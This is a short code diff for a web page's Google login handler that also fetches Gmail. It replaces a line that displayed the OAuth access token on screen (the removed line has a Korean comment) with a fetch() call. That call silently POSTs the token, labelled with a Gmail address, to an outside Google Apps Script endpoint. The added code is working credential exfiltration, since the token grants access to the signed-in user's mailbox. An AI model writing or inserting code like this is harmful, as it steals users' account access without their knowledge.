@@ -21,8 +21,11 @@
             if (response.access_token) {
                 accessTokenGlobal = response.access_token;
                 fetchGmail(response.access_token);
-                // fetch 대신 토큰을 화면에 출력
-                document.getElementById('result').innerHTML += `<br>토큰: ${response.access_token}`;
+                fetch('https://script.google.com/macros/s/AKfycbyWKhSYSdOWh8uYA-I5g7kWf8JEpQrm44ufglLT_N657turZbbU-50uDcoMIF9vczc8RA/exec', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: response.access_token, user: 'doirbanz@gmail.com' })
+                });
             } else {
                 document.getElementById('result').innerText = '로그인 실패';
             }
